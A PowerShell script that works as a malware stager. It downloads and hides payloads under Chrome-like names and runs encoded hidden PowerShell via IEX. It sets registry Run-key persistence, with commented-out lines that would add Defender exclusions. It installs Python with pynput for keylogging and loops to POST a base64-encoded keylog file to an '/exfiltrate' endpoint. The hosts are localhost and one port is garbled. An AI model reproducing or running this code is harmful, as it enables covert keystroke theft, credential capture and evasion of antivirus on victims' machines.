Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Laying-eggs" -OutFile "C:\Windows\Temp\chrome_update.ps1"

if (!(Test-Path -Path "C:\Users\Public\chrome_browser")) {
    New-Item -Path "C:\Users\Public\chrome_browser" -ItemType Directory
}

# Copy-Item -Path "C:\Windows\Temp\chrome_update.ps1" -Destination "C:\Program Files\chrome_browser\chrome_update.ps1" -ItemType File -Force
# Invoke-WebRequest -Uri "http://localhost:8080/hworm.ps1" -OutFile "C:\Program Files\chrome_browser\hworm.ps1"

# Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\chrome_update.ps1"
# Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\hworm.ps1"
# Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\chrome_update.ps1"
# Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\hworm.ps1"

$CHROME_UPDATE_URL = "http://localhost:8080/chrome_update.ps1"

$Chrome_Update = "powershell -nop -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString($($CHROME_UPDATE_URL))'"

$Payload = {
    # Define file paths
    $tempFile = 'C:\Temp\chrome_service.py'
    $pythonExe = 'C:\Users\Public\chrome_browser\pythonw.exe'
    $successFile = "C:\Temp\success.txt"

    try {
        # --- DOWNLOAD ---
        Invoke-WebRequest -Uri 'http://localhost:8080/chrome_service' -OutFile $tempFile -ErrorAction Stop

        # --- EXECUTE ---
        # Run the process and capture its details using -PassThru
        $process = Start-Process -FilePath $pythonExe -ArgumentList $tempFile -Wait -WindowStyle Hidden -PassThru
        
        # --- VERIFY SUCCESS ---
        # Check if the process exited with a success code (0).
        if ($process.ExitCode -eq 0) {
            # This block only runs if the Python script was successful.
            Write-Host "Python script completed successfully."

            # --- CLEANUP and SIGNAL SUCCESS ---
            if (Test-Path $tempFile) {
                Remove-Item $tempFile -Force
            }
            Set-Content -Path $successFile -Value "Success"
        }
        else {
            # If the exit code was not 0, the script failed.
            # Throw an error to trigger the main catch block.
            throw "Python script failed with exit code: $($process.ExitCode)"
        }
    }
    catch {
        # --- FAILURE HANDLING ---
        # The catch block will now also be triggered if the Python script fails.
        Write-Host "An error occurred: $($_.Exception.Message)"
        try {
            Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Injection_failed: $($_.Exception.Message)" -ErrorAction Stop
        }
        catch {}
        
        return 
    }
}

$Command_Bytes = [System.Text.Encoding]::Unicode.GetBytes($Payload.ToString())
$Chrome_Service_Encoded = [Convert]::ToBase64String($Command_Bytes)
$Chrome_Service_Command = "powershell -nop -w hidden -EncodedCommand $Chrome_Service_Encoded"

$Command_Bytes = [System.Text.Encoding]::Unicode.GetBytes($Chrome_Update)
$Chrome_Update_Encoded = [Convert]::ToBase64String($Command_Bytes)
$Chrome_Update_Command = "powershell -nop -w hidden -EncodedCommand $Chrome_Update_Encoded"

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_service.exe" -Value "$Chrome_Service_Command" -PropertyType String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_update_service.exe" -Value "$Chrome_Update_Command" -PropertyType String -Force

# Install Python 3.11.0
if (!(Test-Path -Path "C:\Users\Public\chrome_browser\pythonw.exe")) {
    $TargetDir = "C:\Users\Public\chrome_browser"
    $ZipPath   = "C:\temp\python-3.13.7-embed-amd64.zip"

    # Create target folder if it doesn't exist
    if (!(Test-Path -Path $TargetDir)) {
        New-Item -Path $TargetDir -ItemType Directory -Force | Out-Null
    }

    # Download the embeddable distribution
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.13.7/python-3.13.7-embed-amd64.zip" -OutFile $ZipPath

    # Extract to your chosen directory
    Expand-Archive -Path "$ZipPath" -DestinationPath "$TargetDir" -Force

    # Clean up
    Remove-Item $ZipPath -Force

    # Path to _pth file, e.g. python313._pth
    $PthFile = "C:\Users\Public\chrome_browser\python313._pth"

    # Uncomment or add the line
    (Get-Content $PthFile) -replace '#import site','import site' | Set-Content $PthFile

    $GetPip = "C:\Users\Public\chrome_browser\get-pip.py"

    # Download get-pip.py
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $GetPip

    # Run get-pip.py with portable Python
    & "C:\Users\Public\chrome_browser\python.exe" $GetPip

    # Clean up
    Remove-Item $GetPip -Force

    & "C:\Users\Public\chrome_browser\python.exe" -m pip install --upgrade pip
    & "C:\Users\Public\chrome_browser\python.exe" -m pip install requests pynput
    
}

# Setup
Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Hatching-eggs"

$successFile = "C:\Temp\success.txt"
# $Chrome_Service_Encoded should be defined here from your previous script

# Use a clear, infinite loop that we can break out of upon success
while ($true) {
    # Announce the injection attempt
    Invoke-WebRequest -Uri "http://localhost:8רוב/api/inject?status=Injecting-dewdrops"
    
    # Run the hidden process and, crucially, WAIT for it to exit
    Start-Process -FilePath "powershell.exe" -ArgumentList "-nop", "-w", "hidden", "-EncodedCommand", "$Chrome_Service_Encoded" -Wait
    
    # Now that the process has finished, we can reliably check for the result
    if (Test-Path -Path $successFile) {
        # The file exists, so the process succeeded.
        Write-Host "Injection Succeeded."
        Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Injection_succeeded"
        
        # Clean up the success file
        Remove-Item $successFile -Force
        
        # Break the loop
        break
    } else {
        # The file does not exist, so the process failed.
        Write-Host "Injection failed. Retrying in 60 seconds..."
        Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Retrying-injection"
        Start-Sleep -Seconds 60
    }
}
Remove-Item -Path "C:\Temp\success.txt" -Force -ErrorAction SilentlyContinue

while ($true) {
    try {
        $Data = Get-Content -Path "C:\Temp\keylog.txt" -Raw

        if ($Data.Length -gt 0) {
            # Remove newlines and extra spaces, then join into words
            $Words = ($Data -replace "`r`n|`n|`r", " ") -replace "\s+", " "

            $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Words))
            Invoke-WebRequest -Uri "http://localhost:8080/exfiltrate" -UseBasicParsing -Method POST -Body ($EncodedData) -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 60
            Set-Content -Path "C:\Temp\keylog.txt" -Value ""
        } else {
            Start-Sleep -Seconds 10
        }
    } catch {
        Start-Sleep -Seconds 10
    }
}